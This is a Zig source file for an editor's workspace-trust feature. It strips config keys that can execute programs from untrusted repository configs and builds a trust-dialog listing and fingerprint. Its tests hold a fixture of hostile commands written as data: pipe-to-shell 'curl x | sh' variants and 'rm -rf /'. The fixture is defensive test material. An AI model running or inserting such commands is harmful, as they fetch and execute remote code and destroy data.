//! Workspace trust — the `exec_bearing` table (E1), the stripper for an
//! untrusted layer, and the claims that feed the trust dialog and its
//! fingerprint.
//!
//! A workspace's `.mnml/config.zon` is written by whoever owns the repo,
//! not by the user. Any key that ends in a `spawn` or a `$SHELL -c` is
//! therefore stripped from an untrusted workspace layer while everything
//! ordinary still applies: an untrusted `.lsp.rust` that only widens
//! `.extensions` keeps working against the home-configured binary, and
//! a `.startup.layout` entry of kind `.editor` is harmless and survives.
//!
//! The table is the single description of what counts as exec-bearing.
//! `strip` and `claims` switch on `Sink` exhaustively, so adding a row
//! without teaching both is a compile error.

const std = @import("std");
const Allocator = std.mem.Allocator;
const Config = @import("Config.zig");
const patch_mod = @import("patch.zig");
const Patch = patch_mod.Patch;

pub const Sink = enum {
    language_server,
    formatter,
    linter,
    debug_adapter,
    md_preview,
    startup_pty,
    startup_task,
    external_browser,
    /// `<ws>/.mnml/init.lua` — not a config key but a file beside the
    /// config, which runs with the whole `mnml` table (tasks, panes,
    /// keys) once the workspace is trusted.
    init_lua,

    /// Human label for the trust dialog's bullet list.
    pub fn label(s: Sink) []const u8 {
        return switch (s) {
            .language_server => "language server",
            .formatter => "format on save",
            .linter => "linter",
            .debug_adapter => "debug adapter",
            .md_preview => "markdown preview",
            .startup_pty => "run at startup",
            .startup_task => "task at startup",
            .external_browser => "browser",
            .init_lua => "script",
        };
    }

    /// When it fires, in the user's terms.
    pub fn trigger(s: Sink) []const u8 {
        return switch (s) {
            .language_server => "when you open a file",
            .formatter => "when you save",
            .linter => "when you lint",
            .debug_adapter => "when you start a debug session",
            .md_preview => "when you preview markdown",
            .startup_pty, .startup_task => "immediately, on open",
            .external_browser => "when you open a link",
            .init_lua => "immediately, on open",
        };
    }
};

pub const Rule = struct { path: []const u8, sink: Sink };

/// Every config path that can execute a program. Documentation for
/// humans (`docs/CONFIG.md` lists it) and the reference `strip` /
/// `claims` are written against.
pub const exec_bearing = [_]Rule{
    .{ .path = "ui.external_browser", .sink = .external_browser },
    .{ .path = "ui.md_preview_engine = .{ .custom = … }", .sink = .md_preview },
    .{ .path = "lsp.<name>.cmd / .args", .sink = .language_server },
    .{ .path = "formatters.<ext>", .sink = .formatter },
    .{ .path = "linters.<ext>", .sink = .linter },
    .{ .path = "dap.<name>", .sink = .debug_adapter },
    .{ .path = "startup.layout[] with .kind = .pty", .sink = .startup_pty },
    .{ .path = "startup.tasks", .sink = .startup_task },
    .{ .path = ".mnml/init.lua (the file beside the config)", .sink = .init_lua },
};

/// What the loader knows about the workspace beyond its config patch:
/// whether `<ws>/.mnml/init.lua` exists. The file is never merged into
/// the config, so it cannot be stripped; it simply does not run until
/// the workspace is trusted, and it is a claim so that adding one to a
/// trusted workspace asks again.
pub const Facts = struct {
    init_lua: bool = false,
};

comptime {
    // Every sink has a row, every row a sink.
    for (@typeInfo(Sink).@"enum".fields) |f| {
        const sink = @field(Sink, f.name);
        var found = false;
        for (exec_bearing) |r| found = found or r.sink == sink;
        if (!found) @compileError("trust: no exec_bearing row for sink " ++ f.name);
    }
}

/// Remove every exec-bearing value from `p` in place. Returns how many
/// were removed (0 = the layer was harmless).
pub fn strip(arena: Allocator, p: *Patch(Config)) Allocator.Error!usize {
    var n: usize = 0;
    inline for (comptime std.enums.values(Sink)) |sink| n += try stripSink(sink, arena, p);
    return n;
}

fn stripSink(comptime sink: Sink, arena: Allocator, p: *Patch(Config)) Allocator.Error!usize {
    switch (sink) {
        .external_browser => {
            if (p.ui) |*ui| if (ui.external_browser != null) {
                ui.external_browser = null;
                return 1;
            };
            return 0;
        },
        .md_preview => {
            if (p.ui) |*ui| if (ui.md_preview_engine) |e| if (e == .custom) {
                ui.md_preview_engine = null;
                return 1;
            };
            return 0;
        },
        .language_server => {
            var n: usize = 0;
            for (p.lsp.values()) |*server| {
                if (server.cmd != null or server.args.len != 0) n += 1;
                server.cmd = null;
                server.args = &.{};
            }
            return n;
        },
        .formatter => {
            const n = p.formatters.count();
            p.formatters.clear();
            return n;
        },
        .linter => {
            const n = p.linters.count();
            p.linters.clear();
            return n;
        },
        .debug_adapter => {
            const n = p.dap.count();
            p.dap.clear();
            return n;
        },
        .startup_pty => {
            const startup = &(p.startup orelse return 0);
            const layout = startup.layout orelse return 0;
            var kept: std.ArrayList(Config.LayoutEntry) = .empty;
            for (layout) |e| if (e.kind != .pty) try kept.append(arena, e);
            const n = layout.len - kept.items.len;
            if (n != 0) startup.layout = try kept.toOwnedSlice(arena);
            return n;
        },
        .startup_task => {
            const startup = &(p.startup orelse return 0);
            const tasks = startup.tasks orelse return 0;
            if (tasks.len == 0) return 0;
            startup.tasks = &.{};
            return tasks.len;
        },
        // Nothing in the patch: the file is gated by `workspace_trusted`.
        .init_lua => return 0,
    }
}

/// One executable thing a layer declares — what the trust dialog lists.
pub const Claim = struct {
    sink: Sink,
    /// The config key it came from: `lsp.rust`, `formatters.rs`, …
    key: []const u8,
    /// The command as it would run, verbatim — a hostile `curl … | sh`
    /// should be self-evident, a benign `rust-analyzer` equally so.
    command: []const u8,

    /// `language server rust — runs `rust-analyzer` when you open a file`
    pub fn format(c: Claim, w: *std.Io.Writer) std.Io.Writer.Error!void {
        try w.print("{s} {s} — runs `{s}` {s}", .{ c.sink.label(), c.entryName(), c.command, c.sink.trigger() });
    }

    /// `rust` from `lsp.rust`; the key itself when it has no entry part.
    pub fn entryName(c: Claim) []const u8 {
        if (std.mem.indexOfScalar(u8, c.key, '.')) |dot| {
            if (dot + 1 < c.key.len) return c.key[dot + 1 ..];
        }
        return c.key;
    }

    fn lessThan(_: void, a: Claim, b: Claim) bool {
        if (a.sink != b.sink) return @intFromEnum(a.sink) < @intFromEnum(b.sink);
        switch (std.mem.order(u8, a.key, b.key)) {
            .lt => return true,
            .gt => return false,
            .eq => return std.mem.order(u8, a.command, b.command) == .lt,
        }
    }
};

fn joinArgs(arena: Allocator, cmd: []const u8, args: []const []const u8) Allocator.Error![]const u8 {
    if (args.len == 0) return cmd;
    var out: std.ArrayList(u8) = .empty;
    try out.appendSlice(arena, cmd);
    for (args) |a| {
        try out.append(arena, ' ');
        try out.appendSlice(arena, a);
    }
    return out.toOwnedSlice(arena);
}

fn joinList(arena: Allocator, parts: []const []const u8) Allocator.Error![]const u8 {
    return std.mem.join(arena, " ", parts);
}

/// Everything in `p` that would execute, sorted and stable, so the same
/// file always lists (and fingerprints) the same way.
pub fn claims(arena: Allocator, p: Patch(Config)) Allocator.Error![]Claim {
    return claimsWith(arena, p, .{});
}

/// `claims` plus what the loader saw beside the config.
pub fn claimsWith(arena: Allocator, p: Patch(Config), facts: Facts) Allocator.Error![]Claim {
    var out: std.ArrayList(Claim) = .empty;
    inline for (comptime std.enums.values(Sink)) |sink| try collect(sink, arena, p, facts, &out);
    std.mem.sort(Claim, out.items, {}, Claim.lessThan);
    return out.toOwnedSlice(arena);
}

fn collect(comptime sink: Sink, arena: Allocator, p: Patch(Config), facts: Facts, out: *std.ArrayList(Claim)) Allocator.Error!void {
    switch (sink) {
        .init_lua => {
            if (facts.init_lua) try out.append(arena, .{ .sink = sink, .key = "script.init", .command = ".mnml/init.lua" });
        },
        .external_browser => {
            const ui = p.ui orelse return;
            const b = ui.external_browser orelse return;
            if (b.len != 0) try out.append(arena, .{ .sink = sink, .key = "ui.external_browser", .command = b });
        },
        .md_preview => {
            const ui = p.ui orelse return;
            const e = ui.md_preview_engine orelse return;
            if (e == .custom and e.custom.len != 0) try out.append(arena, .{ .sink = sink, .key = "ui.md_preview_engine", .command = e.custom });
        },
        .language_server => {
            var it = p.lsp.iterator();
            while (it.next()) |e| {
                const cmd = e.value_ptr.cmd orelse continue;
                try out.append(arena, .{
                    .sink = sink,
                    .key = try std.fmt.allocPrint(arena, "lsp.{s}", .{e.key_ptr.*}),
                    .command = try joinArgs(arena, cmd, e.value_ptr.args),
                });
            }
        },
        .formatter => {
            var it = p.formatters.iterator();
            while (it.next()) |e| {
                if (e.value_ptr.cmd.len == 0) continue;
                try out.append(arena, .{
                    .sink = sink,
                    .key = try std.fmt.allocPrint(arena, "formatters.{s}", .{e.key_ptr.*}),
                    .command = try joinList(arena, e.value_ptr.cmd),
                });
            }
        },
        .linter => {
            var it = p.linters.iterator();
            while (it.next()) |e| {
                if (e.value_ptr.cmd.len == 0) continue;
                try out.append(arena, .{
                    .sink = sink,
                    .key = try std.fmt.allocPrint(arena, "linters.{s}", .{e.key_ptr.*}),
                    .command = try joinList(arena, e.value_ptr.cmd),
                });
            }
        },
        .debug_adapter => {
            var it = p.dap.iterator();
            while (it.next()) |e| {
                if (e.value_ptr.cmd.len == 0) continue;
                try out.append(arena, .{
                    .sink = sink,
                    .key = try std.fmt.allocPrint(arena, "dap.{s}", .{e.key_ptr.*}),
                    .command = try joinArgs(arena, e.value_ptr.cmd, e.value_ptr.args),
                });
            }
        },
        .startup_pty => {
            const startup = p.startup orelse return;
            for (startup.layout orelse return) |e| {
                if (e.kind != .pty) continue;
                const cmd = e.cmd orelse continue;
                if (cmd.len != 0) try out.append(arena, .{ .sink = sink, .key = "startup.layout", .command = cmd });
            }
        },
        .startup_task => {
            const startup = p.startup orelse return;
            for (startup.tasks orelse return) |name| {
                // The task body may live in a trusted layer; what this
                // layer asserts is "run <name> on open", so that is the
                // claim.
                const body: []const u8 = if (p.tasks.get(name)) |task| task.cmd else name;
                try out.append(arena, .{
                    .sink = sink,
                    .key = try std.fmt.allocPrint(arena, "startup.tasks.{s}", .{name}),
                    .command = body,
                });
            }
        },
    }
}

/// Stable digest of a claim set: same claims ⇒ same value across runs
/// and machines; any change to a command changes it. Not a security
/// primitive — whoever can edit the workspace config to forge a match
/// can already edit the config, which is the thing being gated. It
/// exists so a workspace trusted once stays trusted until its exec
/// claims change.
pub fn fingerprint(list: []const Claim) u64 {
    var h = std.hash.Fnv1a_64.init();
    for (list) |c| {
        h.update(@tagName(c.sink));
        h.update("\x1f");
        h.update(c.key);
        h.update("\x1f");
        h.update(c.command);
        h.update("\n");
    }
    return h.final();
}

pub fn fingerprintHex(list: []const Claim) [16]u8 {
    var buf: [16]u8 = undefined;
    _ = std.fmt.bufPrint(&buf, "{x:0>16}", .{fingerprint(list)}) catch unreachable;
    return buf;
}

// ─── tests ───────────────────────────────────────────────────────────────

const load = @import("load.zig");
const Diagnostics = @import("diag.zig").Diagnostics;
const t = std.testing;

const hostile_layer =
    \\.{
    \\    .ui = .{
    \\        .md_preview_engine = .{ .custom = "sh -c 'curl x | sh'" },
    \\        .external_browser = "evil-browser",
    \\        .tree_width = 42,
    \\    },
    \\    .lsp = .{
    \\        .rust = .{ .cmd = "/bin/sh", .args = .{ "-c", "curl x|sh" }, .extensions = .{ "rs", "rst" } },
    \\    },
    \\    .formatters = .{ .rs = .{ .cmd = .{ "rustfmt" } } },
    \\    .linters = .{ .sh = .{ .cmd = .{ "shellcheck" }, .parser = .shellcheck } },
    \\    .dap = .{ .lldb = .{ .cmd = "lldb-dap" } },
    \\    .tasks = .{ .evil = .{ .cmd = "rm -rf /" } },
    \\    .startup = .{
    \\        .tasks = .{ "evil" },
    \\        .layout = .{
    \\            .{ .kind = .editor, .path = "README.md" },
    \\            .{ .kind = .pty, .cmd = "curl x | sh", .split = .right },
    \\        },
    \\    },
    \\    .editor = .{ .tab_width = 2 },
    \\}
;

test "an untrusted layer loses exactly the exec-bearing keys" {
    var arena_state = std.heap.ArenaAllocator.init(t.allocator);
    defer arena_state.deinit();
    const arena = arena_state.allocator();
    var diags = Diagnostics.init(arena);
    var p = try load.parseLayer(arena, hostile_layer, "ws.zon", &diags);
    try t.expectEqual(@as(usize, 0), diags.count());

    const before = try claims(arena, p);
    try t.expectEqual(@as(usize, 8), before.len);

    const removed = try strip(arena, &p);
    try t.expectEqual(@as(usize, 8), removed);

    // gone
    try t.expect(p.ui.?.md_preview_engine == null);
    try t.expect(p.ui.?.external_browser == null);
    try t.expect(p.lsp.get("rust").?.cmd == null);
    try t.expectEqual(@as(usize, 0), p.lsp.get("rust").?.args.len);
    try t.expectEqual(@as(usize, 0), p.formatters.count());
    try t.expectEqual(@as(usize, 0), p.linters.count());
    try t.expectEqual(@as(usize, 0), p.dap.count());
    try t.expectEqual(@as(usize, 0), p.startup.?.tasks.?.len);
    try t.expectEqual(@as(usize, 1), p.startup.?.layout.?.len);
    try t.expectEqual(Config.LayoutKind.editor, p.startup.?.layout.?[0].kind);
    // kept
    try t.expectEqual(@as(usize, 2), p.lsp.get("rust").?.extensions.len);
    try t.expectEqual(@as(?u16, 42), p.ui.?.tree_width);
    try t.expectEqual(@as(?u8, 2), p.editor.?.tab_width);
    try t.expectEqual(@as(usize, 1), p.tasks.count()); // a task body is only run on request

    const after = try claims(arena, p);
    try t.expectEqual(@as(usize, 0), after.len);
    try t.expectEqual(@as(usize, 0), try strip(arena, &p)); // idempotent
}

test "claims render for the dialog, sorted, with the verbatim command" {
    var arena_state = std.heap.ArenaAllocator.init(t.allocator);
    defer arena_state.deinit();
    const arena = arena_state.allocator();
    var diags = Diagnostics.init(arena);
    const p = try load.parseLayer(arena, hostile_layer, "ws.zon", &diags);
    const list = try claims(arena, p);
    try t.expectEqual(Sink.language_server, list[0].sink);
    try t.expectEqualStrings("lsp.rust", list[0].key);
    try t.expectEqualStrings("rust", list[0].entryName());
    try t.expectEqualStrings("/bin/sh -c curl x|sh", list[0].command);
    var buf: [256]u8 = undefined;
    var w: std.Io.Writer = .fixed(&buf);
    try list[0].format(&w);
    try t.expectEqualStrings("language server rust — runs `/bin/sh -c curl x|sh` when you open a file", w.buffered());
    // startup task claims carry the body when this layer defines it
    var found = false;
    for (list) |c| if (c.sink == .startup_task) {
        try t.expectEqualStrings("startup.tasks.evil", c.key);
        try t.expectEqualStrings("rm -rf /", c.command);
        found = true;
    };
    try t.expect(found);
    // sorted: sinks in table order, external_browser last
    try t.expectEqual(Sink.external_browser, list[list.len - 1].sink);
}

test "an init.lua beside the config is a claim of its own, and moves the fingerprint" {
    var arena_state = std.heap.ArenaAllocator.init(t.allocator);
    defer arena_state.deinit();
    const arena = arena_state.allocator();
    var diags = Diagnostics.init(arena);
    const p = try load.parseLayer(arena, ".{ .editor = .{ .tab_width = 2 } }", "ws.zon", &diags);
    try t.expectEqual(@as(usize, 0), (try claims(arena, p)).len);
    const with = try claimsWith(arena, p, .{ .init_lua = true });
    try t.expectEqual(@as(usize, 1), with.len);
    try t.expectEqual(Sink.init_lua, with[0].sink);
    var buf: [256]u8 = undefined;
    var w: std.Io.Writer = .fixed(&buf);
    try with[0].format(&w);
    try t.expectEqualStrings("script init — runs `.mnml/init.lua` immediately, on open", w.buffered());
    try t.expect(fingerprint(with) != fingerprint(try claims(arena, p)));
    // Stripping has nothing to remove: the file is gated, not merged.
    var q = p;
    try t.expectEqual(@as(usize, 0), try strip(arena, &q));
}

test "fingerprint is stable, change-sensitive, and blind to ordinary edits" {
    var arena_state = std.heap.ArenaAllocator.init(t.allocator);
    defer arena_state.deinit();
    const arena = arena_state.allocator();
    var diags = Diagnostics.init(arena);
    const a = try load.parseLayer(arena, ".{ .lsp = .{ .rust = .{ .cmd = \"rust-analyzer\" } }, .editor = .{ .tab_width = 2 } }", "a", &diags);
    const b = try load.parseLayer(arena, ".{ .editor = .{ .tab_width = 8 }, .lsp = .{ .rust = .{ .cmd = \"rust-analyzer\" } } }", "b", &diags);
    const c = try load.parseLayer(arena, ".{ .lsp = .{ .rust = .{ .cmd = \"rust-analyzer\", .args = .{ \"--log\" } } } }", "c", &diags);
    const fa = fingerprint(try claims(arena, a));
    const fb = fingerprint(try claims(arena, b));
    const fc = fingerprint(try claims(arena, c));
    try t.expectEqual(fa, fb);
    try t.expect(fa != fc);
    try t.expectEqual(fa, fingerprint(try claims(arena, a)));
    const empty = try claims(arena, .{});
    try t.expectEqual(@as(usize, 0), empty.len);
    try t.expect(fingerprint(empty) != fa);
    try t.expectEqual(@as(usize, 16), fingerprintHex(empty).len);
}
